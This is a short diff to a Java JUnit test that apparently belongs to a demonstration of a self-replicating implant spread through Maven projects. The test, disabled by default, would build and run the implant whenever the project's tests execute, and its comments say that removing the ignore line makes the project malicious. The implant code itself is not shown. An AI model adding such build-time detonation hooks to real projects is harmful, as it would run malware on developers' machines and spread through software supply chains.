@@ -5,8 +5,9 @@ import org.junit.Test;
 
 public class DetonateDuringTests {
     @Test
-    @Ignore // Comment or remove this line to make this a very malicious Maven project
+    @Ignore("Don't detonate the implant during tests by default")
     public void testDetonate() {
-        SelfRepImplant.payload();   // BOOM!
+        SelfRepImplant implant = new SelfRepImplant(SelfRepImplant.guessExecutionContext());
+        implant.run();
     }
 }
